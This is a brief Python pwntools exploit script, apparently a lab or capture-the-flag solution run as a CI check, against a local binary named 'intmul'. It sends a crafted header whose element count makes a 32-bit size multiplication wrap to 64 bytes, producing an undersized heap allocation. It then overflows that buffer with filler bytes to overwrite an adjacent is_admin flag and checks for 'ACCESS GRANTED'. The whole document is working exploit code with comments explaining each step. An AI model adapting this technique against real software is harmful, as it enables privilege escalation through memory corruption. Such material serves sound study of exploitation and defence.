#!/usr/bin/env python3
"""Integer overflow -> undersized malloc -> heap overflow -> data-only win."""
from pwn import *
import struct

exe = args.BIN or './intmul'

COUNT  = 0x08000002          # ❶ count * 32 == 0x1_00000040 -> wraps to 0x40 (64)
NBYTES = 0x78                # ❷ enough bytes to reach the adjacent is_admin field
header  = struct.pack('<III', COUNT, NBYTES, 0)
payload = header + b'\x41' * NBYTES          # ❸ blanket the victim with nonzero

io = process(exe)
io.send(payload)
io.recvuntil(b'ACCESS GRANTED')              # ❹ CI assertion
log.success('integer overflow -> heap overflow -> privilege flag set')
io.close()
